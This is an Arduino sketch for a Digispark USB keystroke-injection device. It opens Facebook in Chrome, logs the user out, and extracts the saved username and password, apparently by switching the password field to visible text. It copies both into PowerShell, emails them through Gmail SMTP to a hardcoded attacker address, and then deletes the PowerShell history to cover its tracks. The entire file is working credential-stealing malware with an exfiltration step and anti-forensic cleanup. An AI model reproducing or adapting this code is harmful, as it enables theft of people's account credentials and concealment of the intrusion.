#include "DigiKeyboard.h"
#include <avr/pgmspace.h>

//Load string into RAM only when needed
const char line1[] PROGMEM = "$ser='smtp.gmail.com';";
const char line2[] PROGMEM = "$msg=New-Object Net.Mail.MailMessage;";
const char line3[] PROGMEM = "$smtp=New-Object Net.Mail.SmtpClient($ser);";
const char line4[] PROGMEM = "$smtp.EnableSsl=$True;";
const char line5[] PROGMEM = "$smtp.Credentials=New-Object System.Net.NetworkCredential('email','password');"; //If you email is example_email@gmail.com, enter example_email (Must be gmail)
const char line6[] PROGMEM = "$msg.From='hueh123hueh@gmail.com';$msg.To.Add('email');$msg.Subject='Pass';"; //Enter full email
const char line7[] PROGMEM = "$msg.Body=$m;$smtp.Send($msg);";
const char line8[] PROGMEM = "del (Get-PSReadlineOption).HistorySavePath;exit\n";
char buffer[100];
#define GetPsz( x ) (strcpy_P(buffer, (char*)x))

//Load characters into RAM
void printText( char * txt ) {
  int l = strlen(txt);
  for (int i = 0; i < l; i++) {
    DigiKeyboard.print( txt[i] );
    DigiKeyboard.update();
  }
}

void setup() {
   //Start Chrome
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
   DigiKeyboard.delay(100);
   DigiKeyboard.println("chrome");
   DigiKeyboard.delay(1000);
   DigiKeyboard.println("facebook.com");
   DigiKeyboard.delay(3500);
   //Log out of Facebook
   for (int i = 0; i < 11; i++) {
    DigiKeyboard.sendKeyStroke(43);
   }
   DigiKeyboard.sendKeyStroke(82);
   DigiKeyboard.delay(1000);
   DigiKeyboard.print("l");
   DigiKeyboard.delay(500);
   DigiKeyboard.print("\n");
   DigiKeyboard.delay(2000);
   //Collect Username
   DigiKeyboard.sendKeyStroke(4,MOD_CONTROL_LEFT);
   DigiKeyboard.sendKeyStroke(6,MOD_CONTROL_LEFT);
   DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
   DigiKeyboard.delay(100);
   DigiKeyboard.print("powershell");
   DigiKeyboard.delay(100);
   DigiKeyboard.print("\n");
   DigiKeyboard.delay(500);
   DigiKeyboard.print("$u='");
   DigiKeyboard.sendKeyStroke(25,MOD_CONTROL_LEFT);
   DigiKeyboard.println("'");
   DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(43,MOD_ALT_LEFT);
   DigiKeyboard.delay(500);
   //Collect Password
   DigiKeyboard.print("\t");
   DigiKeyboard.sendKeyStroke(67,MOD_SHIFT_LEFT);
   DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(82);
   DigiKeyboard.print("\n");
   DigiKeyboard.delay(1000);
   DigiKeyboard.print("\n");
   DigiKeyboard.println("text");
   DigiKeyboard.sendKeyStroke(69);
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(4,MOD_CONTROL_LEFT);
   DigiKeyboard.sendKeyStroke(6,MOD_CONTROL_LEFT);
   DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(43);
   DigiKeyboard.print("\n");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(61,MOD_ALT_LEFT);
   DigiKeyboard.delay(500);
   DigiKeyboard.print("$p='");
   DigiKeyboard.sendKeyStroke(25,MOD_CONTROL_LEFT);
   DigiKeyboard.println("'"); 
   //Email Username and Password
   DigiKeyboard.delay(100);
   DigiKeyboard.println("$m='Username: '+$u+\"`nPassword: \"+$p");
   DigiKeyboard.delay(100);
   printText( GetPsz (line1) );
   printText( GetPsz (line2) );
   printText( GetPsz (line3) );
   printText( GetPsz (line4) );
   printText( GetPsz (line5) );
   printText( GetPsz (line6) );
   printText( GetPsz (line7) );
   printText( GetPsz (line8) );
}

void loop() {
}
